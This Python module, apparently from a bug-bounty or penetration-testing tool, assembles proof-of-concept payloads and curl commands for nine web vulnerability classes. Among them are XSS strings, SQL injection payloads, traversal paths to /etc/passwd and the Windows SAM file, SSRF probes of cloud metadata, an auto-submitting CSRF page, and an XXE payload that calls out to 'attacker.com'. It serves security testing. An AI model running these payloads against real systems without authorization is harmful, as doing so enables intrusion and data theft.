"""
Specialized POC Builders for Evidence Generation - PASSO 6

Provides vulnerability-specific proof-of-concept payload builders:
- XSS (Stored, Reflected, DOM)
- SQL Injection
- IDOR (Insecure Direct Object Reference)
- Path Traversal
- SSRF (Server-Side Request Forgery)
- Open Redirect
- CSRF (Cross-Site Request Forgery)
- XXE (XML External Entity)
"""

from __future__ import annotations

import json
from typing import Any, Dict
import urllib.parse

from hunterops.evidence_orchestrator import POCBuilder, POCPayload
from hunterops.findings import FindingSeverity


# ============================================================================
# XSS Builders
# ============================================================================

class StoredXSSBuilder(POCBuilder):
    """Stored XSS (Cross-Site Scripting) POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build Stored XSS POC."""
        
        injection_point = context.get("injection_point", "comment")
        parameter = context.get("parameter", "text")
        
        # Payload variants
        payloads = {
            "img": f"<img src=x onerror='alert(\"XSS: stored\")'>",
            "svg": f"<svg onload='alert(\"XSS: stored\")'>",
            "iframe": f"<iframe src='javascript:alert(\"XSS: stored\")'></iframe>",
            "script": f"<script>alert('XSS: stored')</script>",
        }
        
        payload_type = context.get("payload_type", "img")
        payload_text = payloads.get(payload_type, payloads["img"])
        
        # Build execution command
        if injection_point == "form":
            execution = f"curl -X POST '{target}' -d '{parameter}={urllib.parse.quote(payload_text)}'"
        else:
            execution = f"curl '{target}?{parameter}={urllib.parse.quote(payload_text)}'"
        
        return POCPayload(
            type="stored_xss",
            description=f"Stored XSS in {injection_point}",
            payload={
                "injection_point": injection_point,
                "parameter": parameter,
                "payload": payload_text,
            },
            execution_method="http_request",
            execution_command=execution,
            expected_result="JavaScript alert() dialog appears to all users viewing the page",
            severity=FindingSeverity.HIGH,
        )


class ReflectedXSSBuilder(POCBuilder):
    """Reflected XSS POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build Reflected XSS POC."""
        
        parameter = context.get("parameter", "q")
        payload_text = context.get("payload", "<svg onload='alert(1)'>")
        
        # Build URL with payload
        separator = "&" if "?" in target else "?"
        poc_url = f"{target}{separator}{parameter}={urllib.parse.quote(payload_text)}"
        
        return POCPayload(
            type="reflected_xss",
            description=f"Reflected XSS in parameter: {parameter}",
            payload={
                "parameter": parameter,
                "payload": payload_text,
                "poc_url": poc_url,
            },
            execution_method="browser",
            execution_command=f"Open in browser: {poc_url}",
            expected_result="JavaScript alert() dialog appears to the user clicking the link",
            severity=FindingSeverity.MEDIUM,
        )


# ============================================================================
# SQL Injection Builders
# ============================================================================

class SQLiBuilder(POCBuilder):
    """SQL Injection POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build SQL Injection POC."""
        
        parameter = context.get("parameter", "id")
        db_type = context.get("db_type", "mysql")
        
        # Payloads for different databases
        payloads = {
            "mysql": {
                "union_based": f"1 UNION SELECT user(), database(), version()",
                "time_based": f"1 AND SLEEP(5)",
                "error_based": f"1' AND extractvalue(1, concat(0x7e, (SELECT user()))) -- -",
            },
            "postgres": {
                "union_based": f"1 UNION SELECT current_user, version()",
                "time_based": f"1 AND pg_sleep(5)",
                "error_based": f"1' AND 1=cast((SELECT current_user) as int) -- -",
            },
            "mssql": {
                "union_based": f"1 UNION SELECT @@version, user_name()",
                "time_based": f"1 AND WAITFOR DELAY '00:00:05'",
                "error_based": f"1' AND 1=(SELECT TOP 1 1 FROM users WHERE 1=1) -- -",
            },
        }
        
        db_payloads = payloads.get(db_type, payloads["mysql"])
        injection_type = context.get("injection_type", "union_based")
        payload_text = db_payloads.get(injection_type, db_payloads["union_based"])
        
        # Build execution
        method = context.get("method", "GET")
        if method.upper() == "GET":
            execution = f"curl '{target}?{parameter}={urllib.parse.quote(payload_text)}'"
        else:
            execution = f"curl -X POST '{target}' -d '{parameter}={urllib.parse.quote(payload_text)}'"
        
        return POCPayload(
            type="sql_injection",
            description=f"SQL Injection in {parameter} ({injection_type})",
            payload={
                "parameter": parameter,
                "database_type": db_type,
                "injection_type": injection_type,
                "payload": payload_text,
            },
            execution_method="http_request",
            execution_command=execution,
            expected_result=f"Database information disclosed or time delay observed",
            severity=FindingSeverity.CRITICAL,
        )


# ============================================================================
# IDOR Builder
# ============================================================================

class IDORBuilder(POCBuilder):
    """IDOR (Insecure Direct Object Reference) POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build IDOR POC."""
        
        id_parameter = context.get("id_parameter", "userId")
        current_id = context.get("current_id", "123")
        target_id = context.get("target_id", "456")
        
        # Build URLs for comparison
        auth_url = f"{target}?{id_parameter}={current_id}"
        unauth_url = f"{target}?{id_parameter}={target_id}"
        
        return POCPayload(
            type="idor",
            description=f"IDOR via {id_parameter} parameter",
            payload={
                "id_parameter": id_parameter,
                "authorized_id": current_id,
                "unauthorized_id": target_id,
                "authorized_url": auth_url,
                "unauthorized_url": unauth_url,
            },
            execution_method="http_request",
            execution_command=f"""
# Authorized request:
curl '{auth_url}' -H 'Authorization: Bearer YOUR_TOKEN' > authorized_response.txt

# Unauthorized request (other user):
curl '{unauth_url}' -H 'Authorization: Bearer YOUR_TOKEN' > unauthorized_response.txt

# Compare responses
diff authorized_response.txt unauthorized_response.txt
""",
            expected_result="Unauthorized user data is returned (show same content as authorized user)",
            severity=FindingSeverity.HIGH,
        )


# ============================================================================
# Path Traversal Builder
# ============================================================================

class PathTraversalBuilder(POCBuilder):
    """Path Traversal / Directory Traversal POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build Path Traversal POC."""
        
        parameter = context.get("parameter", "file")
        file_path = context.get("file_path", "../../../../etc/passwd")
        
        # Build URLs
        traversal_url = f"{target}?{parameter}={urllib.parse.quote(file_path)}"
        
        # Payload variants
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        
        return POCPayload(
            type="path_traversal",
            description=f"Path Traversal in {parameter} parameter",
            payload={
                "parameter": parameter,
                "payloads": payloads,
            },
            execution_method="http_request",
            execution_command=f"curl '{traversal_url}'",
            expected_result="Sensitive file contents or error messages revealing directory structure",
            severity=FindingSeverity.HIGH,
        )


# ============================================================================
# SSRF Builder
# ============================================================================

class SSRFBuilder(POCBuilder):
    """SSRF (Server-Side Request Forgery) POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build SSRF POC."""
        
        parameter = context.get("parameter", "url")
        oob_domain = context.get("oob_domain", "attacker.com")
        
        # Payload variants
        payloads = [
            "http://127.0.0.1:8080/admin",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://localhost:6379/",  # Redis
            f"http://{oob_domain}/callback",  # Full interaction
        ]
        
        return POCPayload(
            type="ssrf",
            description="Server-Side Request Forgery",
            payload={
                "parameter": parameter,
                "payloads": payloads,
                "oob_domain": oob_domain,
            },
            execution_method="http_request",
            execution_command=f"curl '{target}?{parameter}=http://127.0.0.1:8080/admin'",
            expected_result="Server connects to internal resources or OOB domain callback received",
            severity=FindingSeverity.HIGH,
        )


# ============================================================================
# Open Redirect Builder
# ============================================================================

class OpenRedirectBuilder(POCBuilder):
    """Open Redirect POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build Open Redirect POC."""
        
        parameter = context.get("parameter", "redirect_uri")
        redirect_target = context.get("redirect_target", "https://attacker.com")
        
        # Build POC URL
        poc_url = f"{target}?{parameter}={urllib.parse.quote(redirect_target)}"
        
        return POCPayload(
            type="open_redirect",
            description=f"Open Redirect via {parameter}",
            payload={
                "parameter": parameter,
                "redirect_target": redirect_target,
                "poc_url": poc_url,
            },
            execution_method="browser",
            execution_command=f"User visits: {poc_url}",
            expected_result="Browser redirects to attacker domain",
            severity=FindingSeverity.MEDIUM,
        )


# ============================================================================
# CSRF Builder
# ============================================================================

class CSRFBuilder(POCBuilder):
    """CSRF (Cross-Site Request Forgery) POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build CSRF POC."""
        
        method = context.get("method", "POST")
        action_url = context.get("action_url", target)
        parameters = context.get("parameters", {})
        
        # Build HTML form for CSRF
        form_fields = "\n".join([
            f'    <input type="hidden" name="{k}" value="{v}">'
            for k, v in parameters.items()
        ])
        
        html_poc = f"""<html>
<body onload="document.CSRF.submit()">
<form name="CSRF" action="{action_url}" method="{method}">
{form_fields}
</form>
</body>
</html>"""
        
        return POCPayload(
            type="csrf",
            description="Cross-Site Request Forgery",
            payload={
                "action_url": action_url,
                "method": method,
                "parameters": parameters,
                "html": html_poc,
                "html_poc": html_poc,
            },
            execution_method="html_page",
            execution_command=f"Host HTML POC and trick authenticated user to visit",
            expected_result=f"Request executed as authenticated user without consent",
            severity=FindingSeverity.MEDIUM,
        )


# ============================================================================
# XXE Builder
# ============================================================================

class XXEBuilder(POCBuilder):
    """XXE (XML External Entity) POC builder."""
    
    async def build(
        self,
        target: str,
        context: Dict[str, Any],
    ) -> POCPayload:
        """Build XXE POC."""
        
        oob_domain = context.get("oob_domain", "attacker.com")
        
        # XXE payloads
        xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY oob SYSTEM "http://{oob_domain}/xxe?data=">
]>
<foo>&xxe;&oob;</foo>"""
        
        return POCPayload(
            type="xxe",
            description="XML External Entity Injection",
            payload={
                "xxe_payload": xxe_payload,
                "oob_domain": oob_domain,
            },
            execution_method="xml_request",
            execution_command=f"""curl -X POST '{target}' -H 'Content-Type: application/xml' \\
  -d '{xxe_payload}'""",
            expected_result="File contents disclosed or OOB callback received",
            severity=FindingSeverity.CRITICAL,
        )


# ============================================================================
# Builder Factory
# ============================================================================

class POCBuilderFactory:
    """Factory for creating appropriate POC builders."""
    
    _builders = {
        "stored_xss": StoredXSSBuilder,
        "reflected_xss": ReflectedXSSBuilder,
        "sql_injection": SQLiBuilder,
        "idor": IDORBuilder,
        "path_traversal": PathTraversalBuilder,
        "ssrf": SSRFBuilder,
        "open_redirect": OpenRedirectBuilder,
        "csrf": CSRFBuilder,
        "xxe": XXEBuilder,
    }
    
    @classmethod
    def get_builder(cls, vulnerability_type: str) -> POCBuilder:
        """
        Get appropriate builder for vulnerability type.
        
        Args:
            vulnerability_type: Type of vulnerability
        
        Returns:
            POCBuilder instance or raises ValueError
        """
        builder_class = cls._builders.get(vulnerability_type.lower())
        
        if not builder_class:
            raise ValueError(f"No builder registered for vulnerability type: {vulnerability_type}")
        
        return builder_class()
    
    @classmethod
    def register_builder(
        cls,
        vulnerability_type: str,
        builder_class: type[POCBuilder],
    ) -> None:
        """Register custom builder."""
        cls._builders[vulnerability_type.lower()] = builder_class
    
    @classmethod
    def list_builders(cls) -> list[str]:
        """List all registered vulnerability types."""
        return sorted(cls._builders.keys())


# ============================================================================
# Export
# ============================================================================

__all__ = [
    "StoredXSSBuilder",
    "ReflectedXSSBuilder",
    "SQLiBuilder",
    "IDORBuilder",
    "PathTraversalBuilder",
    "SSRFBuilder",
    "OpenRedirectBuilder",
    "CSRFBuilder",
    "XXEBuilder",
    "POCBuilderFactory",
]
